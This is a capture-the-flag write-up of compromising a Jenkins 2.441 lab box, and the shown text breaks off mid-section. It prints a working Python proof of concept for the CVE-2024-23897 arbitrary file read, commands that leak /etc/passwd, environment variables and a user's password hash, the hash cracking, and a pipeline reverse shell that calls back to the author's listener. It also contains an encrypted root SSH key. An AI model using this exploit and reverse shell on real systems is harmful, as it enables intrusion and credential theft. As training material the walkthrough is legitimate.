### Summary
We start this box with a Jenkins instance whose version is susceptible to CVE-2024-23897 which is a partial file read by exploiting the `@` file expansion with the Jenkins CLI. From there we can leak `/proc/self/environ` to find `JENKINS_HOME` and then grab the user, `jennifer`'s `config.xml` which contains a password hash which we crack to gain auth on Jenkins. From there, we can get a reverse shell but it's not useful. We can also inspect the stored credentials on Jenkins to find a root SSH key which, while confidential on the html, is still stored, encrypted, in the source code. We can utilize the `Jenkins Management Script Console` to decrypt it. We could also use the pipeline feature to get `RCE` as root by providing the stored credential to the pipeline, allowing us to leak the ssh key through alternative means

### Tools
- `hashcat`

###### [[#Recon]]
- [[#Initial Scan]]
- [[#HTTP - TCP 8080]]
- [[#CVE-2024-23897]]
	- [[#POC]]
	- [[#File Read Upgrade]]
- [[#File Leak Enumeration]]
	- [[#hashcat]]
###### [[#User Shell - jenkins]]
- [[#Reverse Shell Pipeline]]
- [[#Enumeration as jenkins]]
- [[#Back to HTTP]]
###### [[#Root Shell]]
- [[#Recover SSH Keys]]
	- [[#Decrypt Key]]
	- [[#Pipeline SSH RCE]]
	- [[#Pipeline Dump Credentials]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv $IP -oN nmap/tcp
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 62

❯ sudo nmap -p 22,8080 -sCV -vv $IP -oN nmap/tcpScripts        
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
8080/tcp open  http    syn-ack ttl 62 Jetty 10.0.18
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Dashboard [Jenkins]
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Jetty(10.0.18)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- TTL indicates posix adherent system
- OpenSSH version indicates Ubuntu `22.04`
- We're working with a `Jenkins` http server

## HTTP - TCP 8080
---
- We can navigate to `http://10.129.230.220:8080/` to find a `Jenkins` dashboard, specifically `Jenkins 2.441`
- We can navigate to the `people` tab to find a potential user, `jennifer`

- `Jenkins` is another `Java` web framework
- It has an interesting feature, often allowing us to download the [CLI Client](https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client) from the server itself
```sh
❯ wget http://10.129.230.220:8080/jnlpJars/jenkins-cli.jar
Saving 'jenkins-cli.jar'
HTTP response 200 OK [http://10.129.230.220:8080/jnlpJars/jenkins-cli.jar]
```

- We can run the jarfile and pass it the `Jenkins` url
```sh
❯ java -jar jenkins-cli.jar -s http://10.129.230.220:8080/
  add-job-to-view
    Adds jobs to view.
  build
    Builds a job, and optionally waits until its completion.
  cancel-quiet-down
    Cancel the effect of the "quiet-down" command.
  clear-queue
    Clears the build queue.
  connect-node
    Reconnect to a node(s)
  console
    Retrieves console output of a build.
  copy-job
    Copies a job.
  create-credentials-by-xml
    Create Credential by XML
  create-credentials-domain-by-xml
    Create Credentials Domain by XML
  create-job
    Creates a new job by reading stdin as a configuration XML file.
  create-node
    Creates a new node by reading stdin as a XML configuration.
  create-view
    Creates a new view by reading stdin as a XML configuration.
  declarative-linter
    Validate a Jenkinsfile containing a Declarative Pipeline
  delete-builds
    Deletes build record(s).
  delete-credentials
    Delete a Credential
  delete-credentials-domain
    Delete a Credentials Domain
  delete-job
    Deletes job(s).
  delete-node
    Deletes node(s)
  delete-view
    Deletes view(s).
  disable-job
    Disables a job.
  disable-plugin
    Disable one or more installed plugins.
  disconnect-node
    Disconnects from a node.
  enable-job
    Enables a job.
  enable-plugin
    Enables one or more installed plugins transitively.
  get-credentials-as-xml
    Get a Credentials as XML (secrets redacted)
  get-credentials-domain-as-xml
    Get a Credentials Domain as XML
  get-job
    Dumps the job definition XML to stdout.
  get-node
    Dumps the node definition XML to stdout.
  get-view
    Dumps the view definition XML to stdout.
  groovy
    Executes the specified Groovy script.
  groovysh
    Runs an interactive groovy shell.
  help
    Lists all the available commands or a detailed description of single command.
  import-credentials-as-xml
    Import credentials as XML. The output of "list-credentials-as-xml" can be used as input here as is, the only needed change is to set the actual Secrets which are redacted in the output.
  install-plugin
    Installs a plugin either from a file, an URL, or from update center.
  keep-build
    Mark the build to keep the build forever.
  list-changes
    Dumps the changelog for the specified build(s).
  list-credentials
    Lists the Credentials in a specific Store
  list-credentials-as-xml
    Export credentials as XML. The output of this command can be used as input for "import-credentials-as-xml" as is, the only needed change is to set the actual Secrets which are redacted in the output.
  list-credentials-context-resolvers
    List Credentials Context Resolvers
  list-credentials-providers
    List Credentials Providers
  list-jobs
    Lists all jobs in a specific view or item group.
  list-plugins
    Outputs a list of installed plugins.
  mail
    Reads stdin and sends that out as an e-mail.
  offline-node
    Stop using a node for performing builds temporarily, until the next "online-node" command.
  online-node
    Resume using a node for performing builds, to cancel out the earlier "offline-node" command.
  quiet-down
    Quiet down Jenkins, in preparation for a restart. Don’t start any builds.
  reload-configuration
    Discard all the loaded data in memory and reload everything from file system. Useful when you modified config files directly on disk.
  reload-job
    Reload job(s)
  remove-job-from-view
    Removes jobs from view.
  replay-pipeline
    Replay a Pipeline build with edited script taken from standard input
  restart
    Restart Jenkins.
  restart-from-stage
    Restart a completed Declarative Pipeline build from a given stage.
  safe-restart
    Safe Restart Jenkins. Don’t start any builds.
  safe-shutdown
    Puts Jenkins into the quiet mode, wait for existing builds to be completed, and then shut down Jenkins.
  session-id
    Outputs the session ID, which changes every time Jenkins restarts.
  set-build-description
    Sets the description of a build.
  set-build-display-name
    Sets the displayName of a build.
  shutdown
    Immediately shuts down Jenkins server.
  stop-builds
    Stop all running builds for job(s)
  update-credentials-by-xml
    Update Credentials by XML
  update-credentials-domain-by-xml
    Update Credentials Domain by XML
  update-job
    Updates the job definition XML from stdin. The opposite of the get-job command.
  update-node
    Updates the node definition XML from stdin. The opposite of the get-node command.
  update-view
    Updates the view definition XML from stdin. The opposite of the get-view command.
  version
    Outputs the current version.
  wait-node-offline
    Wait for a node to become offline.
  wait-node-online
    Wait for a node to become online.
  who-am-i
    Reports your credential and permissions.
```

## CVE-2024-23897
---
- We can search `Jenkins 2.441` cve to find an [Arbitrary File Read POC](https://packetstorm.news/files/id/176840)
- The vulnerability is essentially that if we use the CLI command parser and pass `@[file]`, then it expands the file's contents
- We can use the CLI we downloaded to demonstrate
```sh
❯ java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ help '@/etc/passwd'

ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.
 COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)
```
- It leaked part of `/etc/passwd`!

### POC
```python
import threading
import http.client
import time
import uuid
import urllib.parse
import sys
import struct

class Op:
    ARG = 0
    LOCALE = 1
    ENCODING = 2
    START = 3
    EXIT = 4
    STDIN = 5
    END_STDIN = 6
    STDOUT = 7
    STDERR = 8

if len(sys.argv) != 3:
    print('[*] usage: python poc.py http://127.0.0.1:8888/ [/etc/passwd]')
    exit()

text_bytes = ('@' + sys.argv[2]).encode('utf-8') # @[file]
length_prefix = struct.pack('>H', len(text_bytes))
req_data = bytes([Op.ARG]) + length_prefix + text_bytes


data_bytes = b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00' + struct.pack('!B', len(req_data) - 1) + req_data + b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05zh_CN\x00\x00\x00\x00\x03'
target = urllib.parse.urlparse(sys.argv[1])
uuid_str = str(uuid.uuid4())

print(f'REQ: {data_bytes}\n')

# create session
def req1():
    conn = http.client.HTTPConnection(target.netloc)
    conn.request("POST", "/cli?remoting=false", headers={
        "Session": uuid_str,
        "Side": "download"
    })
    print(f'RESPONSE: {conn.getresponse().read()}')

# upload payload
def req2():
    time.sleep(0.3)
    conn = http.client.HTTPConnection(target.netloc)
    conn.request("POST", "/cli?remoting=false", headers={
        "Session": uuid_str,
        "Side": "upload",
        "Content-type": "application/octet-stream"
    }, body=data_bytes)

t1 = threading.Thread(target=req1)
t2 = threading.Thread(target=req2)

t1.start()
t2.start()

t1.join()
t2.join()
```

- The exploit simulates the jenkins CLI and utilizes two request threads
	- One to create a session
	- Another to submit a malicious payload specifying a file to partially leak
- We can test that the script works by attempting to read from `/etc/passwd`
```sh
❯ ./cve-2024-23897.py http://10.129.230.220:8080 /etc/passwd 
REQ: b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@/etc/passwd\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05zh_CN\x00\x00\x00\x00\x03'

RESPONSE: b'\x00\x00\x00\x00\x01\x08\n\x00\x00\x00K\x08ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\x00\x00\x00\x1e\x08java -jar jenkins-cli.jar help\x00\x00\x00\n\x08 [COMMAND]\x00\x00\x00\x01\x08\n\x00\x00\x00N\x08Lists all the available commands or a detailed description of single command.\n\x00\x00\x00J\x08 COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)\n\x00\x00\x00\x04\x04\x00\x00\x00\x02'
```

### File Read Upgrade
- There are a variety of commands in the jarfile that we could prepend to the file leak to hopefully nab more lines of the file

1. We need to grab a list of commands that we can run with the jarfile
```sh
❯ java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ help 2>&1 | grep -P '^  \S+' | awk '$1=$1'
add-job-to-view
build
cancel-quiet-down
clear-queue
connect-node
console
copy-job
create-credentials-by-xml
create-credentials-domain-by-xml
create-job
create-node
```
- `2>&1` because it's printing to stderr and preventing our grep from working
- `\S` is any non-whitespace character (grab just commands, ignore descriptions)
- `awk $1=$1` removes leading (and trailing?) whitespace

2. Since we can't run these commands in succession for some weird bash reason, we'll dump them into a bash script
```sh
❯ cat commands | while read command; do echo "echo -n $command:\ ; java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ $command '@/etc/passwd' 2>&1 | grep -oP ':\d+:\d+:' | sort -u | wc -l"; done > enum.sh
```
- `echo -n $command:\ ` makes smt like `create-job: ` in stdout
- We then have the vulnerable `java -jar` invocation given the command
- We need to pipe everything into stdout so we can play with the output
- Since we're looking at `/etc/passwd` we only want lines that contain `:\d+:\d+:`
- We want to sort the lines so we're not reading in duplicates and then count the line numbers
```sh
❯ ./enum.sh
add-job-to-view: 1
build: 1
cancel-quiet-down: 1
clear-queue: 1
connect-node: 19
console: 1
copy-job: 1
...
```

- The commands that generate the most lines (`19`) are
	- connect-node
	- delete-job
	- delete-node
	- delete-view
	- disconnect-node
	- offline-node
	- online-node
	- reload-job
- Each of these commands result in the same file read capability
```sh
connect-node:
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" exists.
root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin" exists.
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin" exists.
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin" exists.
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin" exists.
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin" exists.
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin" exists.
bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent "bin:x:2:2:bin:/bin:/usr/sbin/nologin" exists.
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin" exists.
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin" exists.
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin" exists.
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin" exists.
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent "jenkins:x:1000:1000::/var/jenkins_home:/bin/bash" exists.
games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent "games:x:5:60:games:/usr/games:/usr/sbin/nologin" exists.
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin" exists.
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" exists.
sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent "sys:x:3:3:sys:/dev:/usr/sbin/nologin" exists.
sync:x:4:65534:sync:/bin:/bin/sync: No such agent "sync:x:4:65534:sync:/bin:/bin/sync" exists.
```

## File Leak Enumeration
---
- We can leak `19` lines from files of our choice
- We're unable to grab `/etc/shadow` and `/etc/passwd` only shows the users `root` and `jenkins` with shell capability
- We can search up "Configuring Jenkins" to find this [docs page](https://www.jenkins.io/doc/book/managing/system-configuration/) that shows us the directory structure of the `JENKINS_HOME` which by default is `/var/lib/jenkins`, but if we attempt to grab the config file at `/var/lib/jenkins/config.xml` we get an error
```sh
❯ ./cve-2024-23897.py http://10.129.230.220:8080 /var/lib/jenkins/config.xml
============================================================
  Jenkins CVE-2024-23897 File Disclosure PoC
============================================================

[+] Target:        http://10.129.230.220:8080
[+] File:          /var/lib/jenkins/config.xml
[+] CLI Retrieved: jenkins-cli.jar
[+] Verbose Cmd:   connect-node

------------------------------------------------------------
[-] File could not be retrieved.
[-] Reason: File does not exist or is inaccessible.
------------------------------------------------------------
```

- We can try to enumerate the environment variables to see where the `JENKINS_HOME` directory might be with `/prof/self/environ`
```sh
❯ ./cve-2024-23897.py http://10.129.230.220:8080 /proc/self/environ         
============================================================
  Jenkins CVE-2024-23897 File Disclosure PoC
============================================================

[+] Target:        http://10.129.230.220:8080
[+] File:          /proc/self/environ
[+] CLI Retrieved: jenkins-cli.jar
[+] Verbose Cmd:   connect-node

------------------------------------------------------------
[+] File Contents (/proc/self/environ)
------------------------------------------------------------

HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalJAVA_HOME=/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementalsCOPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.logPWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441HOME=/var/jenkins_homeLANG=C.UTF-8JENKINS_UC=https://updates.jenkins.ioSHLVL=0JENKINS_HOME=/var/jenkins_homeREF=/usr/share/jenkins/refPATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

------------------------------------------------------------
[+] Lines Retrieved: 1
============================================================
```
- Lucky us, we found `JENKINS_HOME=/var/jenkins_home`

- Now we can try to grab the `config.xml` file again at `/var/jenkins_home/config.xml` and we get a hit!
```xml
<primaryView>all</primaryView>
<label></label>
<clouds/>
<disabledAdministrativeMonitors/>
</authorizationStrategy>
<hudson>
<excludeClientIPFromCrumb>false</excludeClientIPFromCrumb>
</hudson.model.AllView>
</crumbIssuer>
<disableRememberMe>false</disableRememberMe>
<authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">
<viewsTabBar class="hudson.views.DefaultViewsTabBar"/>
</hudson>
<numExecutors>2</numExecutors>
<disableSignup>true</disableSignup>
<properties class="hudson.model.View$PropertyList"/>
</views>
<globalNodeProperties/>
<enableCaptcha>false</enableCaptcha>
<workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>
<denyAnonymousReadAccess>false</denyAnonymousReadAccess>
<scmCheckoutRetryCount>0</scmCheckoutRetryCount>
<?xml version='1.1' encoding='UTF-8'?>
</securityRealm>
<projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>
<crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">
<name>all</name>
<nodeProperties/>
<views>
<slaveAgentPort>50000</slaveAgentPort>
<useSecurity>true</useSecurity>
<buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>
<jdks/>
<version>2.441</version>
<owner class="hudson" reference="../../.."/>
<nodeRenameMigrationNeeded>false</nodeRenameMigrationNeeded>
<filterExecutors>false</filterExecutors>
<filterQueue>false</filterQueue>
<securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
<myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>
<hudson.model.AllView>
<mode>NORMAL</mode>
```
- Nothing super interesting here except some info on the `authorizationStrategy`

- We can check the docs again to find that there'a an `initialAdminPassword` file in the `secrets` directory, but it doesn't exist
- There's an interesting post via [HackTricks](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/jenkins-arbitrary-file-read-to-rce-via-remember-me.html) on arbitrary file read -> RCE on Jenkins
	- It specifies that in `$HOME/users` there's a `users.xml` that specifies the specific directories
	- In our case, the `jennifer` user has a directory `jennifer_12108429903186576833` which contains its own `config.xml`
```xml
...
<version>10</version>
<tokenStore>
<filterExecutors>false</filterExecutors>
<io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>
<passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
```
- Looks like a `bcrypt` hash!

### hashcat
```sh
❯ hashcat -m 3200 jennifer.hash ~/ctf/TOOLS/wordlist/rockyou.txt 
...
$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
...
```
- Nice! our credentials are `jennifer:princess`
- We test them out on the web page and we get auth

# User Shell - jenkins
## Reverse Shell Pipeline
---
- There's another [Hacktricks](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-pipeline.html) post on getting a reverse shell via the jenkins pipeline creator
```text
pipeline {
    agent any
	
    stages {
        stage('Hello') {
            steps {
                sh '''
                    bash -c "bash -i >& /dev/tcp/10.10.15.234/12345 0>&1"
                '''
            }
        }
    }
}
```
- It allows us to invoke shell commands, giving us `RCE`
- We just need to build a new pipeline and it should execute

```sh
❯ nc -lvnp 12345 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.8.175.
Ncat: Connection from 10.129.8.175:58884.
bash: cannot set terminal process group (7): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@0f52c222a4cc:~/workspace/rev$ 
```

## Enumeration as jenkins
---
- We immediately check for `sudo -l` but there is no binary for it on the box

- We can check for `SUID` binaries like so:
```sh
jenkins@0f52c222a4cc:~$ find / -type f -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/openssh/ssh-keysign
```
- Nothing interesting

- There's no crontab for our user or in `/etc/` either
- `/opt` only has `java` and `jenkins` files
- There is no `netstat` or `ss`
- Nothing interesting running via `ps auxww` either
- We could run `psPy` to see if anything is being executed regularly but let's go back to the authenticated site

## Back to HTTP
---
- Since we're logged in as `jennifer`, we can try to check `manage > credentials` to try and read the `root` users creds, an `ssh` key, but it says it's concealed
![[Pasted image 20260225223446.png]]
- Inspecting the page shows something interesting though
```html
<input name="_.privateKey" type="hidden" value="{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}">
```

- If we navigate to `Plugins`, we see a bunch but two of them strike out
![[Pasted image 20260225223716.png]]
- `SSH` plugins that allow incorporation into pipelines

# Root Shell
## Recover SSH Keys
---
- There are a few ways to recover the root `SSH` key stored on `Jenkins`
	- Via Decrypt Key (`Jenkins` Management Script Console)
	- Via Pipeline SSH
	- Via Pipeline Dump Credentials

### Decrypt Key
- We can utilize the secrets already in play on this `Jenkins` instance by decrypting the SSH encoded key stored in the HTML via the `Jenkins` Management Script Console
	- Found the code from a handy [StackOverflow](https://stackoverflow.com/questions/37683143/extract-passphrase-from-jenkins-credentials-xml) post
```js
